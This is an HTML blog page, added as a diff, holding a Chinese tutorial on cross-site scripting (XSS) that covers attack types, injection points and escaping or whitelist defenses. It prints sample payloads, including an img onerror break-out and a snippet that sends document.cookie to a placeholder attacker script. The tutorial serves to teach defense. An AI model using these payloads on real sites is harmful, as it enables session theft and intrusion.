@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/favicon.ico?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web前端,web前端安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XSS Cross Site Scripting 跨站脚本攻击  什么是跨站脚本攻击？我希望我网站的所有前端逻辑都来自于本站，也就是说只有我自己网站东西才可以在我网站上跑。如果我的网站上运行了不属于自己的恶意脚本，那就产生了跨站脚本攻击。 跨站脚本攻击的原理程序 + 数据 = 结果，但数据中包含一部分程序时，整个业务逻">
+<meta name="keywords" content="web前端,web前端安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="你必须懂的前端安全（一）- XSS">
+<meta property="og:url" content="http://yoursite.com/2018/03/12/你必须懂的前端安全（一）- XSS/index.html">
+<meta property="og:site_name" content="0.618:1">
+<meta property="og:description" content="XSS Cross Site Scripting 跨站脚本攻击  什么是跨站脚本攻击？我希望我网站的所有前端逻辑都来自于本站，也就是说只有我自己网站东西才可以在我网站上跑。如果我的网站上运行了不属于自己的恶意脚本，那就产生了跨站脚本攻击。 跨站脚本攻击的原理程序 + 数据 = 结果，但数据中包含一部分程序时，整个业务逻辑其实就改变了。1content 1234content&amp;lt;script&amp;g">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-03-12T07:04:51.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="你必须懂的前端安全（一）- XSS">
+<meta name="twitter:description" content="XSS Cross Site Scripting 跨站脚本攻击  什么是跨站脚本攻击？我希望我网站的所有前端逻辑都来自于本站，也就是说只有我自己网站东西才可以在我网站上跑。如果我的网站上运行了不属于自己的恶意脚本，那就产生了跨站脚本攻击。 跨站脚本攻击的原理程序 + 数据 = 结果，但数据中包含一部分程序时，整个业务逻辑其实就改变了。1content 1234content&amp;lt;script&amp;g">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/12/你必须懂的前端安全（一）- XSS/"/>
+
+
+
+
+
+  <title>你必须懂的前端安全（一）- XSS | 0.618:1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0.618:1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/12/你必须懂的前端安全（一）- XSS/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yyyx">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0.618:1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">你必须懂的前端安全（一）- XSS</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-12T15:03:00+08:00">
+                2018-03-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web前端安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web前端安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><ul>
+<li>Cross Site Scripting</li>
+<li>跨站脚本攻击</li>
+</ul>
+<h3 id="什么是跨站脚本攻击？"><a href="#什么是跨站脚本攻击？" class="headerlink" title="什么是跨站脚本攻击？"></a>什么是跨站脚本攻击？</h3><p>我希望我网站的所有前端逻辑都来自于本站，也就是说只有我自己网站东西才可以在我网站上跑。如果我的网站上运行了不属于自己的恶意脚本，那就产生了跨站脚本攻击。</p>
+<h3 id="跨站脚本攻击的原理"><a href="#跨站脚本攻击的原理" class="headerlink" title="跨站脚本攻击的原理"></a>跨站脚本攻击的原理</h3><p>程序 + 数据 = 结果，但数据中包含一部分程序时，整个业务逻辑其实就改变了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content</span><br><span class="line">&lt;script&gt;</span><br><span class="line">alert(1)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>例如：电商后台中的富文本编辑器本来是供运营人员插入数据的，但被恶意注入了脚本。本来content仅仅是内容，但是现在content变成了一个程序。</p>
+<h3 id="跨站脚本攻击能做什么？"><a href="#跨站脚本攻击能做什么？" class="headerlink" title="跨站脚本攻击能做什么？"></a>跨站脚本攻击能做什么？</h3><p>我们页面中的脚本能做什么？</p>
+<ol>
+<li>页面中的任何数据，脚本都是可以抓取到的。偷取用户的金额，手机号，银行卡号。</li>
+<li>获取cookies,造成cookies中敏感信息外泄。偷取用户的cookie状态，攻击者拿到cookie可以做很多恶意操作。</li>
+<li>劫持前端逻辑，比如欺骗用户，按钮本意是做A动作，XSS攻击是的做B动作。</li>
+<li>发送请求。</li>
+</ol>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="搜索框插入恶意脚本："><a href="#搜索框插入恶意脚本：" class="headerlink" title="搜索框插入恶意脚本："></a>搜索框插入恶意脚本：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">alert(1)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>脚本真的被执行了</p>
+<ul>
+<li>植入恶意脚本<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var img = document.createElement(&apos;img&apos;)</span><br><span class="line">img.width = 0</span><br><span class="line">img.hieght = 0</span><br><span class="line">img.src = `某个php脚本？当前的cookie=encodeURIComponent(document.cookie)`</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>攻击者拿到这个请求，就可以拿到cookie，获取用户登录态，在自己的浏览器操作。</p>
+<h4 id="QQ空间"><a href="#QQ空间" class="headerlink" title="QQ空间"></a>QQ空间</h4><ul>
+<li>QQ空间可以通过日志插入富文本。</li>
+<li>插入script标签，好友浏览我的qq空间，我就可以拿到他们的cookie了。</li>
+</ul>
+<h4 id="商城"><a href="#商城" class="headerlink" title="商城"></a>商城</h4><ul>
+<li>用户表单填写信息后提交给后台，然后进行处理。</li>
+<li>如果用户提交一个脚本，这个脚本就会在工作人员的后台上去运行，可以拿到后台的工作态，通过http的ref头就可以拿到后台的http地址。</li>
+<li>有了后台地址，有了cookie，我们就可以进到他们的后台了。</li>
+</ul>
+<h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>按照攻击代码的来源可以分为：反射型和存储型。<br>反射型直接在URL中带有一长串代码，容易被察觉；而存储型攻击是来自于网站的数据的，所以难以被用户察觉。</p>
+<h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>后台输出数据渲染页面时，需要在页面渲染来自于URL的参数。我将攻击代码直接由URL参数注入，后台会把我的恶意脚本夹带在dom中，浏览器就会去执行。</p>
+<ul>
+<li>传播思路：通过短链接掩盖脚本。</li>
+</ul>
+<h3 id="存储型攻击"><a href="#存储型攻击" class="headerlink" title="存储型攻击"></a>存储型攻击</h3><p>存储到数据库，其它用户访问到时，由读取时注入。</p>
+<ul>
+<li>富文本</li>
+</ul>
+<h2 id="XSS攻击注入点"><a href="#XSS攻击注入点" class="headerlink" title="XSS攻击注入点"></a>XSS攻击注入点</h2><ul>
+<li><p>HTML节点内容<br>如果HTML节点内容是动态生成的，例如评论框的富文本，用户可能向其中写入恶意脚本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这是一个商品</span><br><span class="line">&lt;script&gt;</span><br><span class="line">alert(1)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>HTML属性</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//后端模板要渲染的content依赖于url中 ?content=aaaa&quot;onerror=&quot;alert(1)&quot;，通过 &quot; 提前关闭了属性框。</span><br><span class="line">&lt;img src=&quot;#content&quot;/&gt;</span><br><span class="line">// 渲染后的HTML就会被篡改。</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;/&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>一些标签的属性被篡改。例如img的src。</p>
+<ul>
+<li>JS代码<br>JS渲染页面时，从后台拿数据，后台的数据是从url中取的。JS就会将从url注入的恶意脚本渲染到页面上去。</li>
+<li>富文本<br>富文本插入的HTML，是由被攻击的风险的。</li>
+</ul>
+<h2 id="浏览器自带防御XSS"><a href="#浏览器自带防御XSS" class="headerlink" title="浏览器自带防御XSS"></a>浏览器自带防御XSS</h2><ul>
+<li>浏览器开启了响应头 X-XSS-Protection: 1(默认值)，现代浏览器认为这个页面可能存在了XSS攻击。</li>
+<li>原理：url的参数再次出现在HTML的内容或者属性中，浏览器就会拦截。</li>
+<li>缺点：富文本，JS渲染这种注入方式，是无法拦截的。</li>
+</ul>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><h3 id="HTML节点内容"><a href="#HTML节点内容" class="headerlink" title="HTML节点内容"></a>HTML节点内容</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;content&#125;</span><br></pre></td></tr></table></figure>
+<p>对内容进行转义，将html的尖括号“&lt;”和“&gt;”转义掉。你输入什么，我显示什么，不执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str.replace(/&lt;/g, &apos;&amp;lt&apos;)</span><br><span class="line">str.replace(/&gt;/g, &apos;&amp;gt&apos;)</span><br></pre></td></tr></table></figure></p>
+<h3 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//后端模板要渲染的content依赖于url中 ?content=aaaa&quot;onerror=&quot;alert(1)&quot;，通过 &quot; 提前关闭了属性框。</span><br><span class="line">&lt;img src=&quot;#content&quot;/&gt;</span><br><span class="line">// 渲染后的HTML就会被篡改。</span><br><span class="line">&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;/&gt;</span><br></pre></td></tr></table></figure>
+<p>其实本质是利用”提前关闭了属性，再注入新的属性，解决方式是转义引号<br>单引号也要转义<br>空格也要转义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str.replace(/&quot;/g, &apos;&amp;quto&apos;)</span><br><span class="line">str.replace(/&apos;/g, &apos;&amp;#39&apos;)</span><br></pre></td></tr></table></figure></p>
+<h3 id="Javascript代码"><a href="#Javascript代码" class="headerlink" title="Javascript代码"></a>Javascript代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var data = &apos;#&#123;data&#125;&apos;</span><br><span class="line">var data = &quot;hello&quot;; alert(1); &quot;&quot;;</span><br></pre></td></tr></table></figure>
+<p>转译数据中的引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str.replace(/&quot;/g, &apos;\\&quot;&apos;)</span><br></pre></td></tr></table></figure></p>
+<h3 id="富文本"><a href="#富文本" class="headerlink" title="富文本"></a>富文本</h3><h4 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h4><p>去掉script标签，去掉onerror标签</p>
+<ul>
+<li>优点：实现简单</li>
+<li>缺点：HTML标签繁杂，容易留下漏洞</li>
+</ul>
+<h4 id="白名单过滤"><a href="#白名单过滤" class="headerlink" title="白名单过滤"></a>白名单过滤</h4><p>只允许指定的标签，以及指定的标签保留指定的属性</p>
+<ul>
+<li>优点：不易留下漏洞。</li>
+<li>缺点：实现繁杂，要将HTML解析成树，再组装。</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web前端/" rel="tag"># web前端</a>
+          
+            <a href="/tags/web前端安全/" rel="tag"># web前端安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/01/简单说一说JavaScript的继承/" rel="next" title="简单说一说JavaScripti的继承">
+                <i class="fa fa-chevron-left"></i> 简单说一说JavaScripti的继承
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">yyyx</p>
+              <p class="site-description motion-element" itemprop="description">iezzuyoung@gmail.com</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">62</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-number">1.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是跨站脚本攻击？"><span class="nav-number">1.1.</span> <span class="nav-text">什么是跨站脚本攻击？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跨站脚本攻击的原理"><span class="nav-number">1.2.</span> <span class="nav-text">跨站脚本攻击的原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跨站脚本攻击能做什么？"><span class="nav-number">1.3.</span> <span class="nav-text">跨站脚本攻击能做什么？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#案例"><span class="nav-number">1.4.</span> <span class="nav-text">案例</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#搜索框插入恶意脚本："><span class="nav-number">1.4.1.</span> <span class="nav-text">搜索框插入恶意脚本：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#QQ空间"><span class="nav-number">1.4.2.</span> <span class="nav-text">QQ空间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#商城"><span class="nav-number">1.4.3.</span> <span class="nav-text">商城</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分类"><span class="nav-number">2.</span> <span class="nav-text">分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反射型"><span class="nav-number">2.1.</span> <span class="nav-text">反射型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#存储型攻击"><span class="nav-number">2.2.</span> <span class="nav-text">存储型攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS攻击注入点"><span class="nav-number">3.</span> <span class="nav-text">XSS攻击注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#浏览器自带防御XSS"><span class="nav-number">4.</span> <span class="nav-text">浏览器自带防御XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御措施"><span class="nav-number">5.</span> <span class="nav-text">防御措施</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML节点内容"><span class="nav-number">5.1.</span> <span class="nav-text">HTML节点内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML属性"><span class="nav-number">5.2.</span> <span class="nav-text">HTML属性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Javascript代码"><span class="nav-number">5.3.</span> <span class="nav-text">Javascript代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#富文本"><span class="nav-number">5.4.</span> <span class="nav-text">富文本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#黑名单过滤"><span class="nav-number">5.4.1.</span> <span class="nav-text">黑名单过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#白名单过滤"><span class="nav-number">5.4.2.</span> <span class="nav-text">白名单过滤</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yyyx</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="true"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/love.js"></script>
+  
+    <script type="text/javascript" color="0,0,255" opacity='0.7' zIndex="-1" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+
+</body>
+</html>
